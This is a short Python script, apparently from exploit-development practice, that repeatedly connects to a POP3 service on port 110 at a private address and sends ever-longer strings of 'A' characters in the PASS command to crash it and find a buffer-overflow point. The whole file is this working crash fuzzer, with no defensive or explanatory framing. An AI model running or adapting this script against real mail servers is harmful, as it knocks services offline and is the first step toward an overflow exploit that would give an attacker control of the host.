import socket
import sys
import time


print("[+] Initiating the Crash Now!\n")

buff = "A" * 100

while len(buff) < 5000:

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# Connect to the Application
	s.connect(('192.168.1.117', 110))
	s.recv(1024)	#Recv the banner

	#Enter the User
	s.send('USER hacker\r\n')
	s.recv(1024)

	#Finally the vulnerable command PASS
	s.send('PASS ' + buff + '\r\n')
	s.send('QUIT\r\n')
	s.close()
	print("[+] Currently The Byte Size is %s " % len(buff))
	buff += "A" * 200
	time.sleep(0.5)

